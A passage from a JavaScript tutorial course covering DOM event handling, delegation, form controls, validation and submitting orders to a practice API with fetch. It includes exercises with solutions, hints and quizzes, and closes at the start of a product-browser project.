    console.log(event.type, "on", event.target.id);
  });
</script>
```

`addEventListener(type, handler)` calls `handler` every time the event happens, with an **event object** describing it. The handler runs later, whenever the user clicks: this is the event loop from Lesson 21 at work.

You'll also see `<button onclick="like()">` in old code and tutorials. Avoid it: it mixes code into the HTML, allows only one handler, and is blocked by the security policies (CSP) many sites use.

### Common events

| Event | Fires when | Useful properties |
|---|---|---|
| `click` | a button or element is activated (mouse, tap, or Enter/Space on a button) | `target` |
| `input` | the value of an input, textarea or select changes, on every keystroke | `target.value` |
| `change` | the value is committed (input loses focus, checkbox toggled, option picked) | `target.value`, `target.checked` |
| `keydown` | a key is pressed | `key` (`"Enter"`, `"a"`, `"ArrowUp"`), `ctrlKey`, `metaKey`, `shiftKey` |
| `submit` | a form is submitted (Lesson 29) | |
| `focus` / `blur` | an element gains / loses focus (`focusin` / `focusout` bubble) | |
| `pointerdown`, `pointermove` | mouse, pen or touch (one API for all three) | `clientX`, `clientY` |
| `DOMContentLoaded`, `load` | the HTML is parsed / everything has loaded | |

```html
<input id="search" placeholder="Type, then press Enter">
<script>
  const search = document.querySelector("#search");
  search.addEventListener("input", (e) => console.log("input:", e.target.value));
  search.addEventListener("keydown", (e) => {
    if (e.key === "Enter") console.log("search for", search.value);
    if (e.key === "Escape") search.value = "";
  });
</script>
```

Type in the preview to see an `input` event per keystroke. Use `e.key` (the character or key name); the old `keyCode` numbers are deprecated.

### Default actions and preventDefault

Some events have a **default action** the browser performs after your listeners run: a link navigates, a form submits and reloads the page, a key types a character. `event.preventDefault()` cancels it:

```html
<a id="help" href="https://example.com/help">Help</a>
<input id="digits" placeholder="Digits only">
<script>
  document.querySelector("#help").addEventListener("click", (e) => {
    e.preventDefault();                       // stay on this page
    console.log("Showing help here instead of leaving.");
  });
  document.querySelector("#digits").addEventListener("keydown", (e) => {
    if (e.key.length === 1 && !/\d/.test(e.key)) e.preventDefault();   // block letters
  });
</script>
```

### Bubbling: events travel through the tree

An event doesn't only happen on the element you clicked. It travels **down** from `window` to the target (the **capture** phase), then back **up** through every ancestor (the **bubble** phase). Listeners run in the bubble phase unless you ask for capture.

![Nested boxes: window, document and body, a ul, an li, and a button inside it marked as the target. A purple arrow comes down from window to the button (1. capture), then a teal arrow goes back up from the button to window (3. bubble). By default listeners hear the event on the way up, so a listener on the ul hears clicks on every button inside it](figures/event-flow.svg)

```html
<ul id="list">
  <li><button>Bell</button></li>
</ul>
<script>
  const log = (where) => (e) => console.log(`${where}: target=${e.target.tagName}, currentTarget=${e.currentTarget.tagName ?? "window"}`);
  document.querySelector("button").addEventListener("click", log("button"));
  document.querySelector("li").addEventListener("click", log("li"));
  document.querySelector("#list").addEventListener("click", log("ul"));
  document.querySelector("#list").addEventListener("click", log("ul, capture"), { capture: true });
  document.querySelector("button").click();       // click it from code: the same events fire
</script>
```

- `event.target` is the element where the event happened (the button), the same in every listener.
- `event.currentTarget` is the element whose listener is running now.
- `event.stopPropagation()` stops the event travelling further. It's rarely the right fix; it breaks other code that relies on bubbling, such as analytics and closing menus on outside clicks.

### Event delegation

Because clicks bubble, **one** listener on a container can handle clicks on all its children, including children added later. In the listener, find which item was clicked with `closest`:

```html
<ul id="products">
  <li data-id="2">Bell <button class="add">Add</button></li>
  <li data-id="4">Floor pump <button class="add">Add</button></li>
</ul>
<script>
  const list = document.querySelector("#products");
  list.addEventListener("click", (e) => {
    const button = e.target.closest("button.add");
    if (!button) return;                                  // a click somewhere else in the list
    const id = Number(button.closest("li").dataset.id);
    console.log("add product", id);
  });

  // Added later, and it still works: no new listener needed.
  list.insertAdjacentHTML("beforeend", '<li data-id="6">Puncture kit <button class="add">Add</button></li>');
  document.querySelector('[data-id="6"] .add').click();
</script>
```

(`insertAdjacentHTML` parses HTML like `innerHTML` does, so it's fine here with HTML we wrote, and never with outside data.)

Delegation means fewer listeners, and lists that are re-rendered (Lesson 27) keep working without re-attaching anything.

### Removing listeners

```html
<button id="once">Only the first click counts</button>
<button id="stop">Stop listening</button>
<script>
  document.querySelector("#once").addEventListener("click", () => console.log("first click!"), { once: true });

  const controller = new AbortController();
  window.addEventListener("keydown", (e) => console.log("key", e.key), { signal: controller.signal });
  window.addEventListener("pointerdown", () => console.log("pointer down"), { signal: controller.signal });
  document.querySelector("#stop").addEventListener("click", () => {
    controller.abort();                                   // removes both listeners at once
    console.log("stopped listening to keys and pointers");
  });
</script>
```

- `{ once: true }` removes the listener after it runs once.
- `{ signal }` ties listeners to an `AbortController` (Lesson 25): `abort()` removes them all, the cleanest way to tidy up when a component or dialog closes.
- `removeEventListener(type, handler)` needs the **same function object**, so it can't remove an arrow function written inline.
- `{ passive: true }` promises you won't call `preventDefault`, which lets the browser scroll smoothly while `scroll`, `wheel` and touch listeners run.

### Custom events

Your own code can announce things with `CustomEvent`; `detail` carries the data:

```html
<p id="badge">Cart: 0</p>
<script>
  document.addEventListener("cart:change", (e) => {
    document.querySelector("#badge").textContent = `Cart: ${e.detail.count}`;
    console.log("cart changed", e.detail);
  });
  document.dispatchEvent(new CustomEvent("cart:change", { detail: { count: 3 } }));
</script>
```

This keeps parts of a page independent: the cart announces changes, and the badge listens, without either knowing about the other.

### Make clickable things buttons

Use a `<button>` for anything that does something when clicked, and a link (`<a href>`) for anything that goes somewhere. A `<div>` with a click listener can't be reached with the Tab key, doesn't respond to Enter or Space, and isn't announced as a button by screen readers. A `<button>` does all of that for free; style it however you like with CSS.

:::exercise A quantity stepper
Make the stepper work. Clicking `#plus` adds 1 to the quantity shown in `#qty`, and `#minus` subtracts 1, but the quantity must stay between **1** and **10**. At the limits, disable the button that would go past them (at 1, `#minus` is disabled; at 10, `#plus` is). The page starts at 1, with `#minus` disabled.
```html starter
<!doctype html>
<html lang="en">
<body>
  <button id="minus" aria-label="Less">−</button>
  <output id="qty">1</output>
  <button id="plus" aria-label="More">+</button>

  <script>
    // your code here
  </script>
</body>
</html>
```
```js check
const minus = pick("#minus"), plus = pick("#plus");
same(text("#qty"), "1", "The quantity when the page loads");
same(minus.disabled, true, "#minus disabled when the quantity is 1");
await click(plus);
await click(plus);
same(text("#qty"), "3", "The quantity after clicking + twice");
same(minus.disabled, false, "#minus disabled at 3");
await click(minus);
same(text("#qty"), "2", "The quantity after clicking + twice and − once");
for (let i = 0; i < 12; i++) plus.dispatchEvent(new MouseEvent("click", { bubbles: true }));
await settle(20);
same(text("#qty"), "10", "The quantity after clicking + many times (it must stop at 10)");
same(plus.disabled, true, "#plus disabled at 10");
for (let i = 0; i < 12; i++) await click(minus);
same(text("#qty"), "1", "The quantity after clicking − many times (it must stop at 1)");
same([minus.disabled, plus.disabled], [true, false], "[#minus disabled, #plus disabled] back at 1");
```
```html solution
<!doctype html>
<html lang="en">
<body>
  <button id="minus" aria-label="Less">−</button>
  <output id="qty">1</output>
  <button id="plus" aria-label="More">+</button>

  <script>
    const MIN = 1, MAX = 10;
    let qty = 1;
    const minus = document.querySelector("#minus");
    const plus = document.querySelector("#plus");

    function show() {
      document.querySelector("#qty").textContent = qty;
      minus.disabled = qty <= MIN;
      plus.disabled = qty >= MAX;
    }

    minus.addEventListener("click", () => { qty = Math.max(MIN, qty - 1); show(); });
    plus.addEventListener("click", () => { qty = Math.min(MAX, qty + 1); show(); });
    show();
  </script>
</body>
</html>
```
hint: Keep the quantity in a variable (`let qty = 1`) rather than reading it back from the page each time.
hint: Write one `show()` function that writes `qty` into `#qty` and sets both buttons' `disabled` (`minus.disabled = qty <= 1`). Call it at the start and after every change.
hint: In each click listener, change `qty` but clamp it: `Math.min(10, qty + 1)` and `Math.max(1, qty - 1)`.
approach:
1. **Understand:** a number with limits, two buttons, and button states that follow the number.
2. **Examples:** 1 → + → 2 (minus enabled); 10 → + → still 10.
3. **Brute force:** updating the text and each button separately inside both listeners: duplicated and easy to get out of sync.
4. **Pattern:** **state + render**: change the state, then call one function that makes the page match it.
5. **Plan:** `qty` → `show()` sets text and disabled flags → listeners clamp and call `show()` → call `show()` once at the start.
6. **Code and test:** click to both limits in the preview.
walkthrough:
**Line by line**

- `qty` is the single source of truth; the page only displays it.
- `show()` writes the number and sets `disabled` from conditions, so the buttons can never disagree with the number.
- `Math.max(MIN, qty - 1)` and `Math.min(MAX, qty + 1)` clamp, which also protects against clicks that arrive while a button is being disabled.
- Calling `show()` at the start makes the initial state (minus disabled at 1) come from the same code.

**Trace:** 1 → + → 2 → + → 3 → − → 2; twelve clicks on + stop at 10 and disable +.

**Common wrong approach:** `qty = Number(qtyEl.textContent) + 1` without clamping, and disabling buttons only in some branches: the number escapes the range, or a button stays disabled after coming back from the limit.
:::

:::exercise Add to cart with one listener
Each product has an **Add** button. Use **event delegation**: a **single** `addEventListener` call on `#products` that handles clicks on any `.add` button, including buttons added to the list later.

When a button is clicked, add 1 to that product's count in the `cart` Map (product id as a **number** → quantity), and show the total number of items in `#cart-count` (for example `3 items`, or `1 item`). Clicks elsewhere in the list do nothing.
```html starter
<!doctype html>
<html lang="en">
<body>
  <ul id="products">
    <li data-id="2">Bell <button class="add">Add</button></li>
    <li data-id="4">Floor pump <button class="add">Add</button></li>
    <li data-id="6">Puncture kit <button class="add">Add</button></li>
  </ul>
  <p id="cart-count">0 items</p>

  <script>
    const cart = new Map();

    // your code here
  </script>
</body>
</html>
```
```js check
const theCart = need("cart");
if (!(theCart instanceof Map)) throw new AssertionError("Keep cart as a Map.");
const adds = (__source__.match(/addEventListener/g) || []).length;
if (adds !== 1) throw new AssertionError(`Use exactly one addEventListener call (on #products); your code has ${adds}.`);
await click('[data-id="2"] .add');
await click('[data-id="4"] .add');
await click('[data-id="2"] .add');
same(theCart, new Map([[2, 2], [4, 1]]), "cart after adding the bell twice and the pump once");
same(text("#cart-count"), "3 items", "#cart-count after 3 items");
await click('[data-id="6"]');
await click("#products");
same(text("#cart-count"), "3 items", "#cart-count after clicking an item's text (not its button)");
$("#products").insertAdjacentHTML("beforeend", '<li data-id="9">Lights <button class="add">Add</button></li>');
await click('[data-id="9"] .add');
same(theCart.get(9), 1, "cart.get(9) after clicking a button added to the list later");
same(text("#cart-count"), "4 items", "#cart-count after 4 items");
theCart.clear();
await click('[data-id="6"] .add');
same(text("#cart-count"), "1 item", "#cart-count for exactly one item (no 's')");
```
```html solution
<!doctype html>
<html lang="en">
<body>
  <ul id="products">
    <li data-id="2">Bell <button class="add">Add</button></li>
    <li data-id="4">Floor pump <button class="add">Add</button></li>
    <li data-id="6">Puncture kit <button class="add">Add</button></li>
  </ul>
  <p id="cart-count">0 items</p>

  <script>
    const cart = new Map();

    function showCount() {
      let n = 0;
      for (const qty of cart.values()) n += qty;
      document.querySelector("#cart-count").textContent = `${n} item${n === 1 ? "" : "s"}`;
    }

    document.querySelector("#products").addEventListener("click", (e) => {
      const button = e.target.closest("button.add");
      if (!button) return;
      const id = Number(button.closest("li").dataset.id);
      cart.set(id, (cart.get(id) ?? 0) + 1);
      showCount();
    });
  </script>
</body>
</html>
```
hint: Put the listener on `#products`. Inside it, `e.target.closest("button.add")` is the clicked Add button, or `null` if the click was somewhere else: `return` early in that case.
hint: From the button, `button.closest("li").dataset.id` is the id as a string: convert it with `Number()` before using it as a Map key (`2` and `"2"` are different keys).
hint: `cart.set(id, (cart.get(id) ?? 0) + 1)`, then add up `cart.values()` for the count, with `item` for exactly 1 and `items` otherwise.
approach:
1. **Understand:** one listener for many buttons, counts per product, and a total shown on the page.
2. **Examples:** bell, pump, bell → Map {2 → 2, 4 → 1}, "3 items"; clicking the li text → nothing.
3. **Brute force:** `querySelectorAll(".add").forEach(b => b.addEventListener(…))`: one listener per button, and new buttons get none.
4. **Pattern:** **event delegation**: listen on the container, find the button with `closest`.
5. **Plan:** listener on the list → closest button or return → id → increment in the Map → recount and show.
6. **Code and test:** click in the preview; add an `<li>` with a button to the HTML and click it too.
walkthrough:
**Line by line**

- The single listener on `#products` hears every click inside the list, because clicks bubble up from the button.
- `e.target` may be the button, or something inside it; `closest("button.add")` handles both, and returns `null` for clicks on the text, so the early `return` ignores them.
- `button.closest("li").dataset.id` reads the product id from the item; `Number` makes it a number key.
- `(cart.get(id) ?? 0) + 1` starts a new product at 1 (Lesson 13's counting pattern).
- `showCount` sums the quantities and chooses "item" or "items".

**Trace:** clicks on 2, 4, 2 → Map {2 → 2, 4 → 1}, total 3. The new `<li data-id="9">` needs no setup: its click bubbles to the same listener.

**Common wrong approach:** checking `e.target.tagName === "BUTTON"` instead of `closest`: it breaks as soon as the button contains an icon or a `<span>`, because the target is then the inner element.
:::

:::quiz
? A listener on a ul handles a click on a button inside an li. What are event.target and event.currentTarget?
+ target is the button, currentTarget is the ul
- Both are the ul
- target is the ul, currentTarget is the button
= target is where the event happened; currentTarget is whose listener is running.
? Why does event delegation work for elements added after the listener?
+ Their events bubble up to the container, which already has the listener
- addEventListener watches for new elements automatically
- The browser copies listeners to new elements
= The listener is on the container, which never changes.
? Which is the best way to remove several listeners when a dialog closes?
+ Pass the same AbortController's signal to each, then call abort()
- Call stopPropagation in each listener
- Set the elements' onclick to null
= One abort() removes every listener registered with that signal.
? Why use a <button> instead of a <div> with a click listener?
+ Buttons work with the keyboard and are announced to screen readers
- Divs can't have click listeners
- Buttons are faster
= Divs get none of the keyboard and accessibility behaviour for free.
:::

@@@ lesson
id: forms
title: Forms and user input
minutes: 26
summary: Form controls and labels, reading values (always strings), valueAsNumber, checked, select and radio values, form.elements and FormData, handling submit with preventDefault, built-in validation (required, min, pattern, type=email) with checkValidity and setCustomValidity, live feedback on input, and sending a form to an API with fetch while handling errors and double submits.
---
Forms are how users give a page information: a search box, a checkout, a login. HTML already does a lot of the work: controls, labels, keyboard support and validation. JavaScript reads the values, checks them and sends them.

### Controls and labels

```html
<form id="order">
  <label for="name">Your name</label>
  <input id="name" name="customer" required value="Ada">

  <label for="product">Product</label>
  <select id="product" name="product">
    <option value="2">Bell</option>
    <option value="4" selected>Floor pump</option>
  </select>

  <label for="qty">Quantity</label>
  <input id="qty" name="qty" type="number" value="1" min="1" max="10">

  <label><input name="gift" type="checkbox"> Gift wrap</label>

  <fieldset>
    <legend>Delivery</legend>
    <label><input type="radio" name="delivery" value="standard" checked> Standard</label>
    <label><input type="radio" name="delivery" value="express"> Express</label>
  </fieldset>

  <button>Place order</button>
</form>
<script>
  const form = document.querySelector("#order");
  console.log(form.elements.customer.value);              // controls by their name
  console.log(form.elements.product.value);               // the selected option's value
  console.log(form.elements.qty.value, form.elements.qty.valueAsNumber);
  console.log(form.elements.gift.checked);                // checkboxes: true / false
  console.log(form.elements.delivery.value);              // radio group: the checked one's value
</script>
```

- Every control that should be sent needs a **`name`**.
- A `<label>` linked with `for="id"` (or wrapped around the control) is read out by screen readers, and clicking it focuses the control. Placeholders are not a replacement for labels.
- **Values are strings**, even for `type="number"`. Use `valueAsNumber` or `Number()`; an empty number input gives `""` (and `valueAsNumber` gives `NaN`).
- A `<button>` inside a form is a **submit** button unless it has `type="button"`.

### FormData: every value at once

`new FormData(form)` collects all the named controls the way the browser would send them:

```html
<form id="signup">
  <input name="email" value="ada@example.com">
  <input name="age" type="number" value="36">
  <label><input type="checkbox" name="topics" value="bikes" checked> Bikes</label>
  <label><input type="checkbox" name="topics" value="tools" checked> Tools</label>
  <label><input type="checkbox" name="news"> Newsletter</label>
</form>
<script>
  const data = new FormData(document.querySelector("#signup"));
  console.log(Object.fromEntries(data));        // one value per name (the last one wins)
  console.log(data.getAll("topics"));           // every value for a repeated name
  console.log(data.has("news"));                // unchecked boxes aren't included at all
</script>
```

`Object.fromEntries(new FormData(form))` is the quickest way to get a plain object, but remember: every value is a string, repeated names keep only one value (use `getAll`), and unchecked checkboxes are missing.

### Handling submit

Listen for `submit` on the **form**, not `click` on the button: `submit` also fires when the user presses Enter in a field. Then call `preventDefault()`, or the browser sends the form and reloads the page.

```html
<form id="search">
  <input name="q" required placeholder="Search parts">
  <button>Search</button>
</form>
<p id="result"></p>
<script>
  document.querySelector("#search").addEventListener("submit", (e) => {
    e.preventDefault();                                  // stay on this page
    const q = e.target.elements.q.value.trim();
    document.querySelector("#result").textContent = `Searching for "${q}"…`;
    console.log("submitted:", q);
  });
</script>
```

Type something and press Enter in the preview. Try submitting it empty, too: `required` stops the submit and the browser shows a message, before your listener even runs.

### Built-in validation

| Attribute | Rule |
|---|---|
| `required` | must not be empty |
| `type="email"`, `type="url"` | must look like an email address or URL |
| `min`, `max`, `step` | number and date ranges |
| `minlength`, `maxlength` | text length |
| `pattern="[A-Z]{2}\d{4}"` | must match the regular expression (the whole value) |

The browser checks these rules on submit, shows its own messages, and doesn't fire `submit` while any control is invalid. From JavaScript:

```html
<form id="f" novalidate>
  <input name="code" pattern="[A-Z]{2}\d{4}" required value="ab12">
  <input name="qty" type="number" min="1" max="10" value="12">
</form>
<script>
  const form = document.querySelector("#f");
  console.log(form.checkValidity());                         // false: something is invalid
  for (const el of form.elements) {
    console.log(el.name, el.validity.valid, el.validationMessage || "(ok)");
  }
  const qty = form.elements.qty;
  qty.setCustomValidity(qty.valueAsNumber > 5 ? "Max 5 per order today" : "");   // your own rule
  console.log(qty.validationMessage);
</script>
```

- `checkValidity()` returns `true` or `false`; `reportValidity()` also shows the messages.
- `el.validity` says which rule failed (`valueMissing`, `patternMismatch`, `rangeOverflow`…), and `validationMessage` is the browser's text for it, in the user's language.
- `setCustomValidity("message")` marks a control invalid with your message; `setCustomValidity("")` clears it.
- `novalidate` on the form turns off the automatic check on submit, for when you show errors your own way.
- The CSS pseudo-classes `:invalid` and `:user-invalid` (only after the user has interacted) let you style invalid fields.

**Client-side validation is only for the user's convenience.** Anyone can bypass it, so the server must validate everything again, as the practice API does.

### Live feedback

The `input` event fires on every change, so a page can respond as the user types:

```html
<label for="msg">Message</label>
<textarea id="msg" maxlength="80"></textarea>
<p id="left">80 characters left</p>
<script>
  const msg = document.querySelector("#msg");
  msg.addEventListener("input", () => {
    const left = 80 - msg.value.length;
    document.querySelector("#left").textContent = `${left} character${left === 1 ? "" : "s"} left`;
  });
</script>
```

### Sending a form with fetch

Putting it together with Lesson 24: read the form, send JSON, show the result, and **disable the button while sending**, so an impatient double click doesn't place two orders.

```html
<form id="order">
  <input name="customer" required value="Ada">
  <input name="qty" type="number" min="1" value="2">
  <button>Order inner tubes</button>
</form>
<p id="status" role="status"></p>
<script>
  const form = document.querySelector("#order");
  const status = document.querySelector("#status");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    const button = form.querySelector("button");
    button.disabled = true;
    status.textContent = "Sending…";
    try {
      const res = await fetch("https://shop.example/api/orders", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          customer: form.elements.customer.value.trim(),
          items: [{ productId: 1, qty: form.elements.qty.valueAsNumber }],
        }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error);
      status.textContent = `Order ${data.id} placed: £${(data.total / 100).toFixed(2)}`;
      console.log("placed order", data);
    } catch (err) {
      status.textContent = `Sorry: ${err.message}`;
      console.log("failed:", err.message);
    } finally {
      button.disabled = false;                 // runs after success and after errors
    }
  });
  form.requestSubmit();                        // submit once from code, as if the button was clicked
</script>
```

`role="status"` makes screen readers announce the new text. Try a quantity of 50 in the preview and submit again: the server's error is shown.

:::exercise Live price
Show the price of the order as the user changes it. `#product` options have the product id as their `value` and the price in pence in `data-price`; `#qty` is the quantity.

Whenever either control changes (use the `input` event), set `#total` to the price × quantity in pounds, like `£18.00`. If the quantity isn't a whole number of at least 1 (for example empty, `0` or `2.5`), show `—` instead. Show the right total as soon as the page loads, too.
```html starter
<!doctype html>
<html lang="en">
<body>
  <form id="order">
    <label for="product">Product</label>
    <select id="product" name="product">
      <option value="1" data-price="600">Inner tube</option>
      <option value="4" data-price="3200">Floor pump</option>
      <option value="6" data-price="450">Puncture kit</option>
    </select>
    <label for="qty">Quantity</label>
    <input id="qty" name="qty" type="number" min="1" value="1">
    <p>Total: <output id="total"></output></p>
  </form>

  <script>
    // your code here
  </script>
</body>
</html>
```
```js check
same(text("#total"), "£6.00", "#total when the page loads");
await type("#qty", "3");
same(text("#total"), "£18.00", "#total after typing 3 in #qty");
await type("#product", "4");
same(text("#total"), "£96.00", "#total after choosing the floor pump (quantity 3)");
await type("#qty", "");
same(text("#total"), "—", "#total when the quantity is empty");
await type("#qty", "0");
same(text("#total"), "—", "#total when the quantity is 0");
await type("#qty", "2.5");
same(text("#total"), "—", "#total when the quantity is 2.5");
await type("#qty", "2");
await type("#product", "6");
same(text("#total"), "£9.00", "#total for 2 puncture kits");
```
```html solution
<!doctype html>
<html lang="en">
<body>
  <form id="order">
    <label for="product">Product</label>
    <select id="product" name="product">
      <option value="1" data-price="600">Inner tube</option>
      <option value="4" data-price="3200">Floor pump</option>
      <option value="6" data-price="450">Puncture kit</option>
    </select>
    <label for="qty">Quantity</label>
    <input id="qty" name="qty" type="number" min="1" value="1">
    <p>Total: <output id="total"></output></p>
  </form>

  <script>
    const form = document.querySelector("#order");
    const product = document.querySelector("#product");
    const qty = document.querySelector("#qty");

    function showTotal() {
      const price = Number(product.selectedOptions[0].dataset.price);
      const n = qty.valueAsNumber;
      const total = document.querySelector("#total");
      if (!Number.isInteger(n) || n < 1) {
        total.textContent = "—";
        return;
      }
      total.textContent = `£${(price * n / 100).toFixed(2)}`;
    }

    form.addEventListener("input", showTotal);
    showTotal();
  </script>
</body>
</html>
```
hint: `product.selectedOptions[0]` is the chosen `<option>`; its `dataset.price` is the price as a string.
hint: `qty.valueAsNumber` is `NaN` when the box is empty. `Number.isInteger(n) && n >= 1` rules out `NaN`, `0` and `2.5` in one test.
hint: Put the calculation in a function, call it from an `input` listener (one on the form hears both controls, because `input` bubbles), and call it once at the start.
approach:
1. **Understand:** a derived value (total) that must follow two inputs, with an invalid state.
2. **Examples:** pump × 3 → £96.00; empty → —; 2.5 → —.
3. **Brute force:** separate listeners on each control with duplicated maths.
4. **Pattern:** **one render function** called on load and on every `input`.
5. **Plan:** read price from the selected option → read quantity as a number → validate → format → write.
6. **Code and test:** change both controls in the preview, including clearing the quantity.
walkthrough:
**Line by line**

- `selectedOptions[0].dataset.price` reads the price from the chosen option; `Number` converts it.
- `valueAsNumber` gives a number directly for `type="number"`, or `NaN` when empty.
- `Number.isInteger(n)` is false for `NaN` and `2.5`, so together with `n < 1` it covers every invalid quantity.
- The listener is on the form: `input` events from the select and the number box both bubble to it.
- Calling `showTotal()` once at the end fills in the total before the user does anything.

**Trace:** load: tube × 1 → £6.00; qty 3 → £18.00; pump → 3200 × 3 = 9600 → £96.00; empty → —.

**Common wrong approach:** `price * qty.value`: it works for "3" (the `*` converts), but empty becomes 0 and shows "£0.00" instead of "—", and `2.5` shows a price for half a pump.
:::

:::exercise Send the order form
Make the form place an order with the practice API. On **submit**:

1. stop the page reloading and disable the submit button;
2. POST `{ customer, items: [{ productId, qty }] }` as JSON to `https://shop.example/api/orders`, with the trimmed customer name and the product id and quantity as **numbers**;
3. on success, set `#status` to `Order <id> placed` (for example `Order 1002 placed`) and remove the class `error` from it;
4. if the server answers with an error status, set `#status` to the `error` text from the response body and add the class `error`;
5. always re-enable the button at the end.
```html starter
<!doctype html>
<html lang="en">
<head>
  <style> .error { color: crimson; } </style>
</head>
<body>
  <form id="order">
    <label for="customer">Name</label>
    <input id="customer" name="customer" required>
    <label for="product">Product</label>
    <select id="product" name="product">
      <option value="1">Inner tube</option>
      <option value="4">Floor pump</option>
    </select>
    <label for="qty">Quantity</label>
    <input id="qty" name="qty" type="number" min="1" value="1" required>
    <button>Place order</button>
  </form>
  <p id="status" role="status"></p>

  <script>
    const form = document.querySelector("#order");
    // your code here
  </script>
</body>
</html>
```
```js check
const button = pick("#order button");
const status = pick("#status");
await type("#customer", "  Bo  ");
await type("#product", "1");
await type("#qty", "2");
await submit("#order");
same(button.disabled, true, "button.disabled while the order is being sent");
await waitFor(() => /^Order \d+ placed$/.test(text(status)), '#status to say "Order <id> placed"');
same(text(status), "Order 1002 placed", "#status after the first order");
same(button.disabled, false, "button.disabled after the order finished");
const orders = await (await fetch("https://shop.example/api/orders?customer=Bo")).json();
same(orders.map((o) => o.items), [[{ productId: 1, qty: 2 }]], "The order as the server received it (numbers, not strings)");
await type("#product", "4");
await type("#qty", "50");
await submit("#order");
await waitFor(() => text(status) === "Only 7 Floor pump in stock", '#status to show the server\'s error "Only 7 Floor pump in stock"');
same(status.classList.contains("error"), true, "#status has the class error after a failed order");
same(button.disabled, false, "button.disabled after a failed order");
await type("#qty", "1");
await submit("#order");
await waitFor(() => text(status) === "Order 1003 placed", '#status to say "Order 1003 placed"');
same(status.classList.contains("error"), false, "#status has the class error after a successful order");
```
```html solution
<!doctype html>
<html lang="en">
<head>
  <style> .error { color: crimson; } </style>
</head>
<body>
  <form id="order">
    <label for="customer">Name</label>
    <input id="customer" name="customer" required>
    <label for="product">Product</label>
    <select id="product" name="product">
      <option value="1">Inner tube</option>
      <option value="4">Floor pump</option>
    </select>
    <label for="qty">Quantity</label>
    <input id="qty" name="qty" type="number" min="1" value="1" required>
    <button>Place order</button>
  </form>
  <p id="status" role="status"></p>

  <script>
    const form = document.querySelector("#order");
    const status = document.querySelector("#status");

    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const button = form.querySelector("button");
      button.disabled = true;
      try {
        const res = await fetch("https://shop.example/api/orders", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            customer: form.elements.customer.value.trim(),
            items: [{ productId: Number(form.elements.product.value), qty: form.elements.qty.valueAsNumber }],
          }),
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error);
        status.textContent = `Order ${data.id} placed`;
        status.classList.remove("error");
      } catch (err) {
        status.textContent = err.message;
        status.classList.add("error");
      } finally {
        button.disabled = false;
      }
    });
  </script>
</body>
</html>
```
hint: `form.addEventListener("submit", async (e) => { e.preventDefault(); … })`. The listener can be `async`, so you can `await fetch` inside it.
hint: Build the body from `form.elements`: `.customer.value.trim()`, `Number(.product.value)` and `.qty.valueAsNumber`. Send it with `method: "POST"`, a JSON `Content-Type` header and `JSON.stringify`.
hint: Read `await res.json()`, `throw new Error(data.error)` when `!res.ok`, show the message and add the `error` class in `catch`, and set `button.disabled = false` in `finally`.
approach:
1. **Understand:** submit → send JSON → show success or the server's error → always restore the button.
2. **Examples:** 2 tubes for Bo → "Order 1002 placed"; 50 pumps → "Only 7 Floor pump in stock" in red.
3. **Brute force:** a `click` listener on the button, without `preventDefault`: Enter in a field skips it, and the page reloads.
4. **Pattern:** **submit handler + try / catch / finally** around the request.
5. **Plan:** preventDefault → disable → build body (numbers!) → fetch → json → !ok throw → success text; catch → error text and class; finally → enable.
6. **Code and test:** a valid order, too many pumps, then a valid order again (the error class must go).
walkthrough:
**Line by line**

- `submit` fires for the button and for Enter, and only when the built-in validation passes (`required`, `min`).
- `preventDefault()` keeps the page; disabling the button prevents a second order while the first is in flight.
- `Number(form.elements.product.value)` and `valueAsNumber` send numbers: the API rejects `"2"` as a quantity.
- The API answers with JSON both times, so the body is read before checking `res.ok`; an error status becomes a thrown `Error` carrying the server's message.
- `catch` shows the message and adds `error`; the success path removes it, so an old error style doesn't stick.
- `finally` re-enables the button whether the order worked or not.

**Trace:** Bo, tube × 2 → 201 `{ id: 1002 }` → "Order 1002 placed". Pump × 50 → 409 → "Only 7 Floor pump in stock", red. Pump × 1 → 1003, red removed.

**Common wrong approach:** re-enabling the button only after success: after one error the button stays disabled forever. `finally` exists for exactly this.
:::

:::quiz
? An <input type="number"> shows 5. What is input.value?
+ "5" (a string)
- 5 (a number)
- undefined
= Every value is a string; use valueAsNumber or Number().
? Why listen for submit on the form instead of click on its button?
+ submit also fires when the user presses Enter, and only after validation passes
- click doesn't work on buttons inside forms
- submit is faster
= One submit listener covers every way of submitting.
? What does Object.fromEntries(new FormData(form)) leave out?
+ Unchecked checkboxes (and all but one value of repeated names)
- Number inputs
- Select boxes
= Use getAll for repeated names, and has to test checkboxes.
? The form has required fields and pattern rules. Can the server skip validating the data?
+ No: client-side checks can be bypassed, so the server must check again
- Yes, the browser already did it
- Only if novalidate isn't set
= Browser validation is a convenience for users, not security.
:::

@@@ lesson
id: product-browser
title: "Project: a product browser"
minutes: 30
summary: A complete small app that fetches products from an API and renders them, built step by step: one state object and one render function, loading, empty and error states with a retry button, a search box filtering as you type (with debouncing), a category filter that cancels stale requests with AbortController, announcing changes to screen readers, saving preferences in localStorage, and how frameworks build on the same idea.
---
Time to combine everything from Parts 4 and 5 into one small app: a product browser for the practice shop. It loads products from the API, shows loading and error states, filters by category and searches as you type.

### The plan: state, then render

Interactive pages get messy when every event handler changes the page directly. The approach that scales, and the idea behind every modern framework, is:

1. Keep everything the page shows in one **state** object.
2. Write one **`render()`** function that makes the page match the state.
3. Event handlers only **change the state** and call `render()`.

```js-static
const state = { status: "loading", products: [], query: "", error: null };

function render() {
  // read state, update the page; never the other way round
}

search.addEventListener("input", () => {
  state.query = search.value;     // 1. change the state
  render();                       // 2. redraw from it
});
```

The page can then only show combinations the state allows, and to find a display bug you look in one place.

### The whole app

Run it, then use it in the preview: search, change the category, and watch the output. Each part is explained below.

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Parts</title>
  <style>
    body { font-family: system-ui, sans-serif; margin: 16px; }
    .bar { display: flex; gap: 8px; margin-bottom: 8px; }
    .out { opacity: .5; }
    .error { color: crimson; }
  </style>
</head>
<body>
  <div class="bar">
    <input id="q" type="search" placeholder="Search" aria-label="Search products">
    <select id="category" aria-label="Category">
      <option value="">All</option>
      <option value="parts">Parts</option>
      <option value="tools">Tools</option>
      <option value="accessories">Accessories</option>
    </select>
  </div>
  <p id="status" role="status"></p>
  <button id="retry" hidden>Try again</button>
  <ul id="list"></ul>

